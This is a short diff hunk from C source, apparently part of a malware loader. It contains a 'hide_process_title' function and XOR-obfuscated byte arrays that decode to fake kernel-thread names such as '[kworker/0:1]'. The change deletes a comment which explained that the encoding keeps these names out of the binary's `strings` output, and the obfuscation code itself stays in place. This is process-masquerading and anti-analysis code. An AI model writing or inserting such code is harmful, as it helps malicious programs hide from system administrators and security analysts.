@@ -75,11 +75,7 @@ void hide_process_title(int argc, char* argv[]) {
     }
 }
 
-/*
- * Innocent process names, XOR-encoded with key 0x5A so the plaintext
- * (kernel-thread names like "[kworker/0:1]") never appears in `strings`
- * output of the loader binary. Decoded on demand into a static buffer.
- */
+
 #define INNOCENT_XOR_KEY 0x5A
 
 static const uint8_t innocent_obf_kworker[]   = {0x01, 0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B, 0x07};
